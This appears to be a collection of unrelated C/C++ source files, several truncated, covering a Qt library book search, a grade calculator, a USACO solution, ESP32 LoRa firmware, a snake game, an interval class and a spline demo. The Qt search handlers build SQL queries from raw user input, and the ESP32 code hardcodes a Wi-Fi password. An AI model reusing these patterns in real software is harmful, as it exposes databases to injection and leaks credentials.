    "#include \"bookretrival.h\"\r\n#include \"borrowbook.h\"\r\n#include \"ui_bookretrival.h\"\r\n#include \"QApplication\"\r\n#include <QMEssageBox>\r\n#include <QCoreApplication>\r\n#include <QSqlDatabase>\r\n#include <QSqlQuery>\r\n#include <QSqlError>\r\n#include <QDebug>\r\n#include <QStringList>\r\n\r\nbookRetrival::bookRetrival(QWidget *parent)\r\n    : QWidget(parent)\r\n    , ui(new Ui::bookRetrival)\r\n{\r\n    ui->setupUi(this);\r\n}\r\n\r\nbookRetrival::~bookRetrival()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid bookRetrival::on_retrival2_clicked()\r\n{\r\n    QString str;\r\n    switch(ui->searchindex->currentIndex()){\r\n    case 1:  str=\"bookname\";break;\r\n    case 2:  str=\"author\";break;\r\n    case 3:  str=\"press\";break;\r\n    case 4:  str=\"public_year\";break;\r\n    case 5:  str=\"category\";break;\r\n    }\r\n\r\n    QString query=QString(\"select * from book where %1 like '\\%%2\\%'\").arg(str).arg(ui->queryword->text());\r\n    qDebug()<<query;\r\n    QSqlQuery sql(query);\r\n    int index=0;\r\n    ui->resulttable->clearContents();\r\n    ui->resulttable->setRowCount(0);\r\n    while(sql.next()){\r\n        index=ui->resulttable->rowCount();\r\n        ui->resulttable->insertRow(index);//\u589e\u52a0\u4e00\u884c\r\n        QString ISBN=sql.value(0).toString();\r\n        QString category=sql.value(1).toString();\r\n        QString language=sql.value(2).toString();\r\n        QString bookname=sql.value(3).toString();\r\n        QString author=sql.value(4).toString();\r\n        QString price=sql.value(5).toString();\r\n        QString press=sql.value(6).toString();\r\n        QString public_year=sql.value(7).toString();\r\n        QString storenumber=sql.value(8).toString();\r\n        QString current_num=sql.value(9).toString();\r\n        ui->resulttable->setItem(index,0,new QTableWidgetItem(ISBN));\r\n        ui->resulttable->setItem(index,1,new QTableWidgetItem(bookname));\r\n        ui->resulttable->setItem(index,2,new QTableWidgetItem(category));\r\n        ui->resulttable->setItem(index,3,new QTableWidgetItem(author));\r\n        ui->resulttable->setItem(index,4,new QTableWidgetItem(press));\r\n        ui->resulttable->setItem(index,5,new QTableWidgetItem(language));\r\n        ui->resulttable->setItem(index,6,new QTableWidgetItem(public_year));\r\n        ui->resulttable->setItem(index,7,new QTableWidgetItem(storenumber));\r\n        ui->resulttable->setItem(index,8,new QTableWidgetItem(price));\r\n        ui->resulttable->setItem(index,9,new QTableWidgetItem(current_num));\r\n        //index++;\r\n    }\r\n}\r\n\r\n\r\nvoid bookRetrival::on_retirval1_clicked()\r\n{\r\n    QString str;\r\n    switch(ui->searchindex->currentIndex()){\r\n    case 1:  str=\"bookname\";break;\r\n    case 2:  str=\"author\";break;\r\n    case 3:  str=\"press\";break;\r\n    case 4:  str=\"public_year\";break;\r\n    case 5:  str=\"category\";break;\r\n    }\r\n\r\n    QString query=QString(\"select * from book where %1='%2'\").arg(str).arg(ui->queryword->text());\r\n    qDebug()<<query;\r\n    QSqlQuery sql(query);\r\n    int index=0;\r\n    ui->resulttable->clearContents();\r\n    ui->resulttable->setRowCount(0);\r\n    while(sql.next()){\r\n        index=ui->resulttable->rowCount();\r\n        ui->resulttable->insertRow(index);//\u589e\u52a0\u4e00\u884c\r\n        QString ISBN=sql.value(0).toString();\r\n        QString category=sql.value(1).toString();\r\n        QString language=sql.value(2).toString();\r\n        QString bookname=sql.value(3).toString();\r\n        QString author=sql.value(4).toString();\r\n        QString price=sql.value(5).toString();\r\n        QString press=sql.value(6).toString();\r\n        QString public_year=sql.value(7).toString();\r\n        QString storenumber=sql.value(8).toString();\r\n        QString current_num=sql.value(9).toString();\r\n\r\n        ui->resulttable->setItem(index,0,new QTableWidgetItem(ISBN));\r\n        ui->resulttable->setItem(index,1,new QTableWidgetItem(bookname));\r\n        ui->resulttable->setItem(index,2,new QTableWidgetItem(category));\r\n        ui->resulttable->setItem(index,3,new QTableWidgetItem(author));\r\n        ui->resulttable->setItem(index,4,new QTableWidgetItem(press));\r\n        ui->resulttable->setItem(index,5,new QTableWidgetItem(language));\r\n        ui->resulttable->setItem(index,6,new QTableWidgetItem(public_year));\r\n        ui->resulttable->setItem(index,7,new QTableWidgetItem(storenumber));\r\n        ui->resulttable->setItem(index,8,new QTableWidgetItem(price));\r\n        ui->resulttable->setItem(index,9,new QTableWidgetItem(current_num));\r\n        //index++;\r\n        //ui->resulttable->setRowCount(index);\r\n    }\r\n}\r\n\r\n\r\nvoid bookRetrival::on_pushButton_clicked()\r\n{\r\n    borrowbook * bb=new borrowbook();\r\n    bb->show();\r\n}\r\n\r\n\r\nvoid bookRetrival::on_search_clicked()\r\n{   QString bookname=ui->bookname->text();\r\n    QString author=ui->author->text();\r\n    QString low_price=ui->low_price->text();\r\n    QString high_price=ui->high_price->text();\r\n    QString low_year=ui->low_year->text();\r\n    QString high_year=ui->high_year->text();\r\n    QString press;\r\n    switch(ui->press->currentIndex()){\r\n    case 0: press=\"press\";break;\r\n    case 1: press=\"\u7535\u5b50\u5de5\u4e1a\u51fa\u7248\u793e\";break;\r\n    case 2: press=\"\u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e\";break;\r\n  ",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct Mahasiswa {\r\n    string nama;\r\n    float nilaiUTS;\r\n    float nilaiUAS;\r\n    float nilaiAkhir;\r\n    char nilaiHuruf;\r\n};\r\n\r\n// Fungsi untuk menentukan nilai huruf berdasarkan nilai hasil\r\nchar getNilaiHuruf(float nilai) {\r\n    if (nilai >= 80)\r\n        return 'A';\r\n    else if (nilai >= 70)\r\n        return 'B';\r\n    else if (nilai >= 56)\r\n        return 'C';\r\n    else if (nilai >= 47)\r\n        return 'D';\r\n    else\r\n        return 'E';\r\n}\r\n\r\nint main() {\r\n    int banyakData;\r\n    cout << \"Masukkan banyak data: \";\r\n    cin >> banyakData;\r\n\r\n    vector<Mahasiswa> daftarMahasiswa(banyakData);\r\n\r\n    for (int i = 0; i < banyakData; ++i) {\r\n        cout << \"\\nData Mahasiswa ke-\" << i + 1 << \":\" << endl;\r\n        cout << \"Nama Mahasiswa: \";\r\n        cin.ignore();\r\n        getline(cin, daftarMahasiswa[i].nama);\r\n        cout << \"Nilai UTS: \";\r\n        cin >> daftarMahasiswa[i].nilaiUTS;\r\n        cout << \"Nilai UAS: \";\r\n        cin >> daftarMahasiswa[i].nilaiUAS;\r\n\r\n        // Menghitung nilai akhir\r\n        daftarMahasiswa[i].nilaiAkhir = (daftarMahasiswa[i].nilaiUAS * 0.4) + (daftarMahasiswa[i].nilaiUTS * 0.6);\r\n        // Menentukan nilai huruf\r\n        daftarMahasiswa[i].nilaiHuruf = getNilaiHuruf(daftarMahasiswa[i].nilaiAkhir);\r\n    }\r\n\r\n    // Menampilkan tabel\r\n    cout << \"| No | Nama Mahasiswa | Nilai UTS | Nilai UAS | Nilai Akhir | Nilai Huruf |\\n\";\r\n    cout << \"|----|----------------|-----------|-----------|-------------|-------------|\\n\";\r\n    for (int i = 0; i < banyakData; ++i) {\r\n        cout << \"| \" << i + 1 << \"  | \" << daftarMahasiswa[i].nama << \" \";\r\n        cout << \" | \" << daftarMahasiswa[i].nilaiUTS << \"        | \" << daftarMahasiswa[i].nilaiUAS << \"        | \";\r\n        cout << daftarMahasiswa[i].nilaiAkhir << \"        | \" << daftarMahasiswa[i].nilaiHuruf << \"          |\\n\";\r\n    }\r\n\r\n    return 0;\r\n}",
    "// A solution to Lifeguards: USACO 2018 January Contest, Bronze (Problem 2)\n\n#include <assert.h>\n\n#include <fstream>\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\n// Input and output files\nconst string INPUT_FILE_NAME = \"lifeguards.in\";\nconst string OUTPUT_FILE_NAME = \"lifeguards.out\";\n\n// Constraints given by the prompt\nconst unsigned int MIN_TIME = 0;\nconst unsigned int MAX_TIME = 1000;\nconst unsigned int NUM_SHIFTS = MAX_TIME - MIN_TIME;\n\n// Store start and end times for a lifeguard shift\ntypedef struct lifeguard {\n    unsigned int start;\n    unsigned int end;\n} lifeguard_t;\n\nint main(int argc, char **argv) {\n    // Check for command-line usage errors\n    if (argc != 2) {\n        cerr << \"Usage: \" << argv[0] << \" \" << INPUT_FILE_NAME << endl;\n        return 1;\n    }\n\n    // Create a file stream to read the input file\n    ifstream input_file(INPUT_FILE_NAME);\n\n    // Input file error handling\n    if (!input_file.is_open()) {\n        cerr << \"Unable to open file: \" << INPUT_FILE_NAME << endl;\n        return 1;\n    }\n\n    // Read the number of lifguards\n    unsigned int num_lifeguards = 0;\n    input_file >> num_lifeguards;\n    assert(num_lifeguards >= 1 && num_lifeguards <= 1000);\n\n    // Declare lifeguard array\n    lifeguard_t lifeguards[num_lifeguards];\n\n    // Read start and end times for all lifeguards\n    for (unsigned int i = 0; i < num_lifeguards; i++) {\n        unsigned int start_time = 0;\n        input_file >> start_time;\n        assert(start_time >= 0 && start_time <= 1000);\n        unsigned int end_time = 0;\n        input_file >> end_time;\n        assert(end_time >= 0 && end_time <= 1000);\n        lifeguards[i] = lifeguard_t{start_time, end_time};\n    }\n\n    // Close the input file\n    input_file.close();\n\n    // Store the number of lifeguards on duty at any given point in time\n    unsigned int lifeguards_on_duty[NUM_SHIFTS];\n    // Initialize the number of lifeguards on duty at all points in time to 0\n    for (unsigned int i = 0; i < NUM_SHIFTS; i++) {\n        lifeguards_on_duty[i] = 0;\n    }\n\n    // Populate the number of lifeguards on duty\n    for (unsigned int i = 0; i < num_lifeguards; i++) {\n        lifeguard_t lifeguard = lifeguards[i];\n        for (unsigned int j = lifeguard.start; j < lifeguard.end; j++) {\n            lifeguards_on_duty[j]++;\n        }\n    }\n\n    // Determine the maximum amount of time that can be covered by the remaining\n    // lifeguards after firing exactly one lifeguard\n    unsigned int max_time = 0;\n    for (unsigned int i = 0; i < num_lifeguards; i++) {\n        // Choose which lifeguard will be fired\n        lifeguard_t fired_lifeguard = lifeguards[i];\n        unsigned int curr_max = 0;\n        for (unsigned int j = 0; j < NUM_SHIFTS; j++) {\n            unsigned int num_on_duty = lifeguards_on_duty[j];\n            // Decrement the number of lifeguards on duty if the current shift\n            // will be affected by the fired lifeguard\n            if (j >= fired_lifeguard.start && j < fired_lifeguard.end) {\n                num_on_duty--;\n            }\n            // Increment the amount of time covered\n            if (num_on_duty >= 1) {\n                curr_max++;\n            }\n        }\n        // Update the maximum amount of time that can be covered\n        if (curr_max > max_time) {\n            max_time = curr_max;\n        }\n    }\n\n    // Create a file stream to write the output file\n    ofstream output_file(OUTPUT_FILE_NAME);\n\n    // Output file error handling\n    if (!output_file.is_open()) {\n        cerr << \"Unable to open file: \" << OUTPUT_FILE_NAME << endl;\n        return 1;\n    }\n\n    // Write to the output file\n    output_file << max_time << endl;\n\n    // Close the output file\n    output_file.close();\n\n    return 0;\n}\n",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <AsyncTCP.h>\n#include <ESPAsyncWebServer.h>\n#include \"SPIFFS.h\"\n#include <ArduinoJson.h>\n\n#include <SPI.h>\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n\n#define SCREEN_WIDTH 128 // OLED display width, in pixels\n#define SCREEN_HEIGHT 32 // OLED display height, in pixels\n#define OLED_RESET     -1 // Reset pin # (or -1 if sharing Arduino reset pin)\n#define SCREEN_ADDRESS 0x3C ///< See datasheet for Address; 0x3D for 128x64, 0x3C for 128x32\n#define RXD2 20\n#define TXD2 21\n\n//notas da musica\n#define NOTE_E2  82\n#define NOTE_AS2 117\n#define NOTE_C3  131\n#define NOTE_D3  147\n#define NOTE_E3  165\n#define REST      0\n\nint musica = 0;\nint tempo = 225;\nint buzzer = 10;\n\n\nint melody[] = {  // doom\n  NOTE_E2, 8, NOTE_E2, 8, NOTE_E3, 8, NOTE_E2, 8, NOTE_E2, 8, NOTE_D3, 8, NOTE_E2, 8, NOTE_E2, 8,\n  NOTE_C3, 8, NOTE_E2, 8, NOTE_E2, 8, NOTE_AS2, -2,\n};\n\n// DADOS PARA CONTROLE DE FLUXO\n String filename = \"/img.bmp\";\n int packtes = 0; // quantidade de paquetes que ira receber\n int recebido = 0;// quando recebe algum pacote \n String hexString = \"\"; // variavel para guardar dados em exa\n\n int soma =0;\n int imgs = 0;\n// Replace with your network credentials\nconst char* ssid = \"ZOE\";//\"server\";\nconst char* password = \"43633151b\";//\"12345678\";\n\n// Create AsyncWebServer object on port 80\nAsyncWebServer server(80);\n\n// Create a WebSocket object\nAsyncWebSocket ws(\"/ws\");\n\n// Timer variables\nunsigned long lastTime = 0;\nunsigned long timerDelay = 3000; // 3 segundos\n\n\nint notes = sizeof(melody) / sizeof(melody[0]) / 2;\nint wholenote = (60000 * 4) / tempo;\nint divider = 0, noteDuration = 0;\n\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);\n\nString ajustarString(String input);\nvoid initSPIFFS();\nvoid tocar();\nvoid display_init();\nvoid writeFile(String path, String message, const char* modo);\nvoid serialcomando();\nString getSensorReadings();\nvoid initWebSocket();\nvoid onEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len);\nvoid initWiFi();\nvoid notifyClients(String sensorReadings);\nvoid handleWebSocketMessage(void *arg, uint8_t *data, size_t len);\nvoid confRouter();\nvoid display_init();\nvoid writeFile(String path, String message, const char* modo);\nString ajustarString(String input);\nvoid atualizar();\n// fun\u00e7oes de teste abaixo\nvoid encoders();\nvoid decoders(String hexString);\n\n\n\n\nvoid setup() {\n  Serial.begin(115200);\n  Serial1.begin(9600, SERIAL_8N1, RXD2, TXD2);\n  initWiFi();\n  initSPIFFS();\n  initWebSocket();\n  confRouter();\n  display_init();\n\n   Serial.println(\"iniciado...\");\n\n   Serial1.readString();\n}\n\nvoid loop() {\n\n  // tesde de encoder e decoder \n  //--------------------------------------------------------\n\n//delay(5000);\n//encoders();\n//delay(1000);\n//decoders();\n\n//if ((millis() - lastTime) > timerDelay) {\n    //String sensorReadings = getSensorReadings(); // atualiza a imagem\n   // notifyClients(sensorReadings);\n   // lastTime = millis(); \n\n // }\n // ws.cleanupClients();\n  \n\n\n  //--------------------------------------------------------\n\n String loraDados;\n if(Serial1.available()>0)\n  { \n   \n    delay(300);\n    String tamanhos;\n    while(Serial1.available())\n    {\n      char c = Serial1.read();\n\n      if(c == '0')\n      tamanhos += c;\n      if(c == '1')\n      tamanhos += c;\n      if(c == '2')\n      tamanhos += c;\n      if(c == '3')\n      tamanhos += c;\n      if(c == '4')\n      tamanhos += c;\n      if(c == '5')\n      tamanhos += c;\n      if(c == '6')\n      tamanhos += c;\n      if(c == '7')\n      tamanhos += c;\n      if(c == '8')\n      tamanhos += c;\n      if(c == '9')\n      tamanhos += c;\n      if(c == ' ')\n      tamanhos += c;\n       if(c == '\\r')\n      tamanhos += c;\n       if(c == '\\n')\n      tamanhos += c;\n\n    }\n\n   \n    Serial.println(\"recebido tamanho: \"+tamanhos );\n    packtes = tamanhos.toInt();\n\n    display.clearDisplay();\n    display.setTextSize(1); \n    display.setTextColor(SSD1306_WHITE);\n    display.setCursor(0, 0);\n    display.println(ajustarString(\"recebido> \" + String(recebido) + \" de \" + String(packtes))); // ajusta\n    display.display();// mosta o texto ajustado \n    Serial.println(\"recebido tamanho e foi resetado\");\n    recebido++;\n\n   \n    tone(10,440,100); //LA\n    \n    \n    long time_out = millis();\n    loraDados = \"\";\n  \n    while(millis() - time_out < 3000)\n    {\n        if(Serial1.available()>0)\n        {\n          loraDados += Serial1.readString();\n          time_out = millis();\n          recebido++;\n          atualizar();\n          //Serial.println(\"reveiver\");\n          Serial.println(recebido);\n\n        }\n      \n    }\n     packtes = 0;\n     recebido = 0;\n    //writeFile(filename, loraDados , \"w\");// sobrescreve\n    decoders(loraDados);\n    Serial.println(\"escrito na memoria\");\n    tocar();\n\n  }\n\n\n\n  if ((millis() - lastTime) > timerDelay) {\n    String sensorReadings = getSensorReadings();\n    notifyClients(sensorReadings);\n    lastTime",
    "//Headers\r\n#include \"food.hpp\"\r\n\r\nconst float DELAY = 0.6f;\r\nconst int WIN_WIDTH = 420, WIN_HEIGHT = 420;\r\nconst int PX = 15, MAX_SIZE = WIN_HEIGHT/PX;\r\nenum DIRS {RIGHT,DOWN,UP,LEFT,PAUSE};\r\nenum DIRS current_direction = PAUSE;\r\nint score = 3;\r\nsf::RectangleShape rect;\r\nstd::vector<sf::Vector2i> snake;\r\nint x_increment = PX, y_increment = PX;\r\nFood snake_food(PX,(WIN_HEIGHT+WIN_WIDTH)/2);\r\nbool ate = false;\r\nsf::Vector2i temp;\r\n\r\nvoid init_sanke (std::vector<sf::Vector2i>& _snake, const int _score) {\r\n    for (int i = 0; i < _score; i++) {\r\n        _snake.push_back(sf::Vector2i((10-i)*PX,PX));\r\n    }\r\n}\r\nvoid init_rect (sf::RectangleShape& _rect) {\r\n    _rect .setFillColor(sf::Color::White);\r\n    _rect.setSize(sf::Vector2f(PX,PX));\r\n}\r\nvoid draw_snake (sf::RenderWindow& _window,sf::RectangleShape& _rect,std::vector<sf::Vector2i>& _snake) {\r\n    for (int i = 0; i < score; i++) {\r\n        _rect.setFillColor((i) ? sf::Color::White : sf::Color::Red);\r\n        _rect.setPosition(_snake[i].x,_snake[i].y);\r\n        _window.draw(_rect);\r\n    }\r\n}\r\nvoid change_direction (sf::Event& e, enum DIRS &_direction) {\r\n    if (e.type == sf::Event::KeyPressed) {\r\n        switch (e.key.code) {\r\n            case sf::Keyboard::W:     _direction = (_direction==DOWN ) ? DOWN : UP   ; break;\r\n            case sf::Keyboard::S:     _direction = (_direction==UP   ) ? UP   : DOWN ; break;\r\n            case sf::Keyboard::A:     _direction = (_direction==RIGHT) ? RIGHT: LEFT ; break;\r\n            case sf::Keyboard::D:     _direction = (_direction==LEFT ) ? LEFT : RIGHT; break;\r\n            case sf::Keyboard::Space: _direction = PAUSE; break;\r\n            default: return;\r\n        }\r\n    }\r\n}\r\n\r\nvoid update_snake (std::vector<sf::Vector2i>& _snake, enum DIRS &_direction,int& _x, int& _y, sf::Vector2i& temp) {\r\n    switch (_direction) {\r\n        case RIGHT : \r\n            _x = PX;\r\n            _y = 0 ;\r\n            break  ;\r\n        case LEFT  :\r\n            _x =-PX;\r\n            _y = 0 ;\r\n            break  ;\r\n        case UP    :\r\n            _x = 0 ;\r\n            _y =-PX;\r\n            break  ;\r\n        case DOWN  :\r\n            _x = 0 ;\r\n            _y = PX;\r\n            break  ;\r\n        case PAUSE :\r\n            _x = 0 ;\r\n            _y = 0 ;\r\n            break  ;\r\n    }\r\n    _snake.insert(_snake.begin(),sf::Vector2i(_snake[0].x+_x,snake[0].y+_y));\r\n    temp = _snake[score-1]; \r\n    if (!ate) {\r\n        _snake.pop_back();\r\n    } else {\r\n        _snake.push_back(temp);\r\n        ate = !ate;\r\n    }\r\n\r\n    if (snake[0].x<0) {\r\n        _snake.insert(_snake.begin(),sf::Vector2i(WIN_WIDTH-PX,snake[0].y));\r\n        _snake.pop_back(); \r\n    } else if (snake[0].x>WIN_WIDTH) {\r\n        _snake.insert(_snake.begin(),sf::Vector2i(0,snake[0].y));\r\n        _snake.pop_back(); \r\n    } else if (snake[0].y>WIN_HEIGHT) {\r\n        _snake.insert(_snake.begin(),sf::Vector2i(snake[0].x,0));\r\n        _snake.pop_back(); \r\n    } else if (snake[0].y<0) {\r\n        _snake.insert(_snake.begin(),sf::Vector2i(snake[0].x,WIN_HEIGHT-PX));\r\n        _snake.pop_back(); \r\n    }\r\n}\r\n\r\nint main () {\r\n    float timer = 0, t = 0;\r\n    init_rect(rect);\r\n    init_sanke(snake,score);\r\n    sf::Event e;\r\n    sf::Clock clock;\r\n    sf::RenderWindow window(sf::VideoMode(WIN_WIDTH,WIN_HEIGHT),\"snake game [ferdinaldo]\",sf::Style::Close);\r\n\r\n    while (window.isOpen()) {\r\n        while (window.pollEvent(e)) {\r\n            if (e.type==sf::Event::Closed) window.close();\r\n            change_direction(e,current_direction);\r\n        }\r\n        window.clear(sf::Color::Black);\r\n        snake_food.draw_food(window,snake,score,ate);\r\n        draw_snake(window,rect,snake);\r\n        t = clock.getElapsedTime().asSeconds();\r\n        timer+=t;\r\n        \r\n        if (timer>DELAY&&current_direction!=PAUSE) {\r\n            timer = 0.5f;\r\n            update_snake(snake,current_direction,x_increment,y_increment,temp);\r\n        }\r\n        clock.restart();\r\n        window.display();\r\n        window.setFramerateLimit(120);\r\n    }\r\n    return 0;\r\n}",
    "#include \"Interval.h\"\r\n\r\nInterval::Interval() : years(0), months(0), days(0), hours(0), minutes(0), seconds(0) {}\r\n\r\nInterval::Interval(int y, int m, int d, int h, int min, int sec)\r\n    : years(y), months(m), days(d), hours(h), minutes(min), seconds(sec) {}\r\n\r\nstd::string Interval::toISOString() const{\r\n\r\n    std::stringstream ss;\r\n    ss << std::setfill('0') << std::setw(2) << years << \"-\" << std::setw(2) << months << \"-\" << std::setw(2) << days\r\n        << \" \" << std::setw(2) << hours << \":\" << std::setw(2) << minutes << \":\" << std::setw(2) << seconds;\r\n\r\n    return ss.str();\r\n\r\n}\r\n\r\nInterval Interval::operator+(const Interval& other) const{\r\n\r\n    return Interval(years + other.years, months + other.months, days + other.days,\r\n        hours + other.hours, minutes + other.minutes, seconds + other.seconds);\r\n\r\n}\r\n\r\nInterval Interval::operator-(const Interval& other) const{\r\n\r\n    return Interval(years - other.years, months - other.months, days - other.days,\r\n        hours - other.hours, minutes - other.minutes, seconds - other.seconds);\r\n\r\n}\r\n\r\nInterval Interval::operator*(double factor) const{\r\n\r\n    int totalSeconds = years * 365 * 24 * 60 * 60 + months * 30 * 24 * 60 * 60 + days * 24 * 60 * 60 +\r\n        hours * 60 * 60 + minutes * 60 + seconds;\r\n    totalSeconds *= factor;\r\n    int y = totalSeconds / (365 * 24 * 60 * 60);\r\n    totalSeconds %= (365 * 24 * 60 * 60);\r\n    int m = totalSeconds / (30 * 24 * 60 * 60);\r\n    totalSeconds %= (30 * 24 * 60 * 60);\r\n    int d = totalSeconds / (24 * 60 * 60);\r\n    totalSeconds %= (24 * 60 * 60);\r\n    int h = totalSeconds / (60 * 60);\r\n    totalSeconds %= (60 * 60);\r\n    int min = totalSeconds / 60;\r\n    totalSeconds %= 60;\r\n    int sec = totalSeconds;\r\n\r\n    return Interval(y, m, d, h, min, sec);\r\n\r\n}\r\n\r\nInterval Interval::operator/(double divisor) const{\r\n\r\n    return Interval(years / divisor, months / divisor, days / divisor,\r\n        hours / divisor, minutes / divisor, seconds / divisor);\r\n\r\n}\r\n\r\nInterval& Interval::operator+=(const Interval& other){\r\n\r\n    years += other.years;\r\n    months += other.months;\r\n    days += other.days;\r\n    hours += other.hours;\r\n    minutes += other.minutes;\r\n    seconds += other.seconds;\r\n\r\n    return *this;\r\n\r\n}\r\n\r\nInterval& Interval::operator-=(const Interval& other){\r\n\r\n    years -= other.years;\r\n    months -= other.months;\r\n    days -= other.days;\r\n    hours -= other.hours;\r\n    minutes -= other.minutes;\r\n    seconds -= other.seconds;\r\n\r\n    return *this;\r\n\r\n}\r\n\r\nstd::istream& operator>>(std::istream& is, Interval& interval){\r\n\r\n    is >> interval.years >> interval.months >> interval.days >> interval.hours >> interval.minutes >> interval.seconds;\r\n    return is;\r\n\r\n}\r\n",
    "#include <Novice.h>\n#include \"cmath\"\n#include <assert.h>\n#include \"imgui.h\"\n#define _USE_MATH_DEFINES\n#include<math.h>\n#include <algorithm>\n\nconst char kWindowTitle[] = \"LD2B_08_\u30ef\u30bf\u30ca\u30d9_\u30ca\u30aa_\u30bf\u30a4\u30c8\u30eb\";\n\nstruct Vector3 {\n\tfloat x;\n\tfloat y;\n\tfloat z;\n};\n\nstruct Matrix4x4 {\n\tfloat m[4][4];\n};\n\nstruct Sphere {\n\tVector3 center;//\u4e2d\u5fc3\u70b9\n\tfloat radius;\n};\n\n//X\u8ef8\u56de\u8ee2\u884c\u5217\nMatrix4x4 MakeRotateXMatrix(float radian);\n//Y\u8ef8\u56de\u8ee2\u884c\u5217\nMatrix4x4 MakeRotateYMatrix(float radian);\n//Z\u8ef8\u56de\u8ee2\u884c\u5217\nMatrix4x4 MakeRotateZMatrix(float radian);\n//3\u6b21\u5143\u30a2\u30d5\u30a3\u30f3\u5909\u63db\u884c\u5217\nMatrix4x4 MakeAffineMatrix(const Vector3& scale, const Vector3& rotate, const Vector3& translate);\n//\u9006\u884c\u5217\nMatrix4x4 Inverse(const Matrix4x4& m);\n//\u6295\u8cc7\u6295\u5f71\u884c\u5217\nMatrix4x4 MakePerspectiveFovMatrix(float fovY, float aspectRadio, float nearClip, float farClip);\n//\u30d3\u30e5\u30fc\u30dd\u30fc\u30c8\u884c\u5217\nMatrix4x4 MakeViewportMatrix(float left, float top, float width, float height, float minDepth, float maxDepth);\n//\u7a4d\nMatrix4x4 MatrixMultiply(const Matrix4x4& m1, const Matrix4x4& m2);\n//\u30b9\u30ab\u30e9\u30fc\u500d\nVector3 Multiply(float scalar, const Vector3 v);\n//\u5ea7\u6a19\u5909\u63db\nVector3 Transform(const Vector3& vector, const Matrix4x4& matrix);\n//\u6b63\u898f\u5316\nVector3 Normalize(Vector3 vector);\n//\u9577\u3055\nfloat Length(const Vector3& v);\n//\u5185\u7a4d\nfloat Dot(const Vector3& v1, const Vector3& v2);\n//\u30af\u30ed\u30b9\u7a4d\nVector3 Cross(const Vector3& v1, const Vector3& v2);\nVector3 Add(const Vector3& v1, const Vector3& v2);\nVector3 Subtract(const Vector3& v1, const Vector3& v2);\n\nvoid DrawGrit(const Matrix4x4& viewProjectionMatrix, const Matrix4x4& viewportMatrix);\n\nVector3 Lerp(const Vector3& a, const Vector3& b, float t);\nVector3 Bezier(const Vector3& p0, const Vector3& p1, const Vector3& p2, float t);\nvoid DrawBezier(const Vector3& p0, const Vector3& p1, const Vector3& p2, const Matrix4x4& viewProjectionMatrix, const Matrix4x4& viewportMatrix, uint32_t color);\nvoid DrawSphere(const Sphere& sphere, const Matrix4x4& viewProjectionMatrix, const Matrix4x4& viewportMatrix, uint32_t color);\n\nVector3 CatmullRom(const Vector3& p0, const Vector3& p1,\n\tconst Vector3& p2, const Vector3& p3, float t);\nvoid DrawCatmullRom(const Vector3& p0, const Vector3& p1, const Vector3& p2, const Vector3& p3, const Matrix4x4& viewProjectionMatrix, const Matrix4x4& viewportMatrix, uint32_t color);\n\n// Windows\u30a2\u30d7\u30ea\u3067\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u30dd\u30a4\u30f3\u30c8(main\u95a2\u6570)\nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {\n\n\t// \u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u521d\u671f\u5316\n\tNovice::Initialize(kWindowTitle, 1280, 720);\n\n\tVector3 cameraTranslate{ 0.0f,1.9f,-6.49f };\n\tVector3 cameraRotate{ 0.26f,0.0f,0.0f };\n\tVector3 cameraPosition = { 0.0f,0.0f,-300.0f };\n\tint kWindowWidth = 1280;\n\tint kWindowHeight = 720;\n\n\tVector3 controlPoints[4] = {\n\t\t{-0.8f,0.58f,1.0f},\n\t\t{1.76f,1.0f,-0.3f},\n\t\t{0.94f,-0.7f,2.3f},\n\t\t{-0.53f,-0.26f,-0.15f}\n\t};\n\n\tfloat radius = 0.03f;\n\n\n\n\t// \u30ad\u30fc\u5165\u529b\u7d50\u679c\u3092\u53d7\u3051\u53d6\u308b\u7bb1\n\tchar keys[256] = { 0 };\n\tchar preKeys[256] = { 0 };\n\n\t// \u30a6\u30a3\u30f3\u30c9\u30a6\u306e\u00d7\u30dc\u30bf\u30f3\u304c\u62bc\u3055\u308c\u308b\u307e\u3067\u30eb\u30fc\u30d7\n\twhile (Novice::ProcessMessage() == 0) {\n\t\t// \u30d5\u30ec\u30fc\u30e0\u306e\u958b\u59cb\n\t\tNovice::BeginFrame();\n\n\t\t// \u30ad\u30fc\u5165\u529b\u3092\u53d7\u3051\u53d6\u308b\n\t\tmemcpy(preKeys, keys, 256);\n\t\tNovice::GetHitKeyStateAll(keys);\n\n\t\t///\n\t\t/// \u2193\u66f4\u65b0\u51e6\u7406\u3053\u3053\u304b\u3089\n\t\t///\n\n\t\tMatrix4x4 cameraMatrix = MakeAffineMatrix({ 1.0f,1.0f,1.0f }, cameraRotate, cameraTranslate);\n\t\tMatrix4x4 viewMatrix = Inverse(cameraMatrix);\n\t\tMatrix4x4 projectionMatrix = MakePerspectiveFovMatrix(0.45f, float(kWindowWidth) / float(kWindowHeight), 0.1f, 100.0f);\n\t\tMatrix4x4 worldViewProjectionMatrix = MatrixMultiply(viewMatrix, projectionMatrix);\n\t\tMatrix4x4 viewportMatrix = MakeViewportMatrix(0, 0, float(kWindowWidth), float(kWindowHeight), 0.0f, 1.0f);\n\n\n\t\tImGui::Begin(\"Window\");\n\t\tImGui::DragFloat3(\"CameraTranslate\", &cameraTranslate.x, 0.01f);\n\t\tImGui::DragFloat3(\"CameraRotate\", &cameraRotate.x, 0.01f);\n\t\tImGui::DragFloat3(\"controlPoints[0]\", &controlPoints[0].x, 0.01f);\n\t\tImGui::DragFloat3(\"controlPoints[1]\", &controlPoints[1].x, 0.01f);\n\t\tImGui::DragFloat3(\"controlPoints[2]\", &controlPoints[2].x, 0.01f);\n\t\tImGui::DragFloat3(\"controlPoints[3]\", &controlPoints[3].x, 0.01f);\n\n\t\tImGui::End();\n\n\n\t\t///\n\t\t/// \u2191\u66f4\u65b0\u51e6\u7406\u3053\u3053\u307e\u3067\n\t\t///\n\n\t\t///\n\t\t/// 